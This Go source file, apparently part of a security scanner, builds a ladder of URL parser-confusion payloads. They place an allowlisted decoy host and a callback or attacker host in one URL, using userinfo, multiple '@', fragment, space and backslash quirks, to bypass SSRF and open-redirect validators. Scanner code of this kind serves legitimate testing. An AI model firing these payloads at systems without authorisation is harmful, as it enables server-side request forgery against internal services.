package infra

// URL parser/fetcher "authority confusion" payload ladder.
//
// Background: many SSRF allowlists and redirect validators parse a URL to extract
// its host, then a *different* component (libcurl, the browser, getaddrinfo)
// re-parses the same string and disagrees about which host it names. An attacker
// lives in that gap. The payloads here place a `decoy` host (the one a validator
// is expected to see and allow) and an `effective` host (the one the
// fetcher/redirector should actually reach) into a single URL using the parser
// divergences documented in Orange Tsai's "A New Era of SSRF — Exploiting URL
// Parser in Trending Programming Languages" (Black Hat USA 2017): userinfo (`@`),
// multiple `@`, fragment (`#`), whitespace, tab, and backslash.
//
// A consumer injects each payload into a URL-like parameter (or redirect target)
// and looks for an out-of-band hit (OAST callback to `effective`) or an in-band
// redirect to `effective`.
//
// Delivery contract: payloads carry only *literal* characters (real `@ # space
// tab \`), never pre-percent-encoded sequences. Callers deliver them through
// httpmsg.InsertionPoint.BuildRequest, which query-encodes the value for safe
// transit (`@`→%40, `#`→%23, space→%20, tab→%09, `\`→%5C); the target server
// decodes the literal character back before feeding its own URL parser — which is
// exactly the real attacker scenario. Double-decode (`%2509`) variants, which
// instead require the literal percent sequence to survive un-re-encoded to the
// target, need a raw-delivery path and are intentionally deferred to a later
// iteration.

// ConfusionClass categorizes a payload by the parser quirk it exercises.
type ConfusionClass string

const (
	// ConfusionAuthority covers userinfo/fragment/whitespace/backslash
	// disagreements about the authority (host) component.
	ConfusionAuthority ConfusionClass = "authority"
)

// ConfusionPayload is a single URL-confusion test value.
type ConfusionPayload struct {
	// Value is the literal URL string to inject as the parameter / redirect value.
	Value string
	// Label is a short human-readable description of the quirk, for finding evidence.
	Label string
	// Class is the parser-quirk family this payload belongs to.
	Class ConfusionClass
}

// confusionSchemes are the URL schemes each authority-confusion quirk is emitted
// under. Both are tried because an SSRF fetcher or redirect validator may accept
// only one, and http vs https also reach different default ports.
var confusionSchemes = []string{"https://", "http://"}

// AuthorityConfusionPayloads returns the parser-vs-fetcher authority-disagreement
// ladder. `decoy` is the host a validator is expected to extract and allow (e.g.
// the target's own domain, or a benign allowlisted domain); `effective` is the
// host the fetcher/redirector should actually reach (e.g. an OAST callback host,
// or an attacker domain).
//
// Both orientations of each quirk are emitted: which side "wins" depends on the
// specific (validator, fetcher) parser pair, which is unknown in a black-box scan.
// The caller throws the whole ladder and lets the OAST callback (for SSRF) or the
// observed redirect target (for open redirect) reveal which payload won.
//
// The set is kept intentionally tight (8 quirks × 2 schemes) so per-parameter
// request volume stays bounded; callers still gate with their own dedup/disk-set.
func AuthorityConfusionPayloads(decoy, effective string) []ConfusionPayload {
	out := make([]ConfusionPayload, 0, 8*len(confusionSchemes))
	for _, s := range confusionSchemes {
		out = append(out,
			// Single userinfo `@`: standard parsers place the host after the `@`.
			// Beats prefix/substring validators that only check the start of the URL.
			ConfusionPayload{s + decoy + "@" + effective + "/", "userinfo: decoy@effective", ConfusionAuthority},
			ConfusionPayload{s + effective + "@" + decoy + "/", "userinfo: effective@decoy (inverse)", ConfusionAuthority},
			// Userinfo carrying a port — confuses parsers that split on the colon first.
			ConfusionPayload{s + decoy + ":80@" + effective + "/", "userinfo+port: decoy:80@effective", ConfusionAuthority},
			// Multiple `@` — cURL/libcurl take the FIRST host, most others the LAST.
			ConfusionPayload{s + "foo@" + effective + ":80@" + decoy + "/", "multi-@: cURL→effective, others→decoy", ConfusionAuthority},
			// Fragment `#` — parse_url() cuts the authority at `#`; libcurl/readfile do not.
			ConfusionPayload{s + decoy + "#@" + effective + "/", "fragment: validator→decoy, fetcher→effective", ConfusionAuthority},
			ConfusionPayload{s + effective + "#@" + decoy + "/", "fragment: validator→effective, fetcher→decoy (inverse)", ConfusionAuthority},
			// Space — Tsai's bypass of cURL's `@`-handling patch; getaddrinfo also
			// strips trailing rubbish following whitespace.
			ConfusionPayload{s + effective + " @" + decoy + "/", "space: cURL→effective", ConfusionAuthority},
			// Backslash — treated as a path separator by some parsers, a host
			// character (or slash) by others.
			ConfusionPayload{s + decoy + `\` + effective + "/", `backslash: decoy\effective`, ConfusionAuthority},
		)
	}
	return out
}
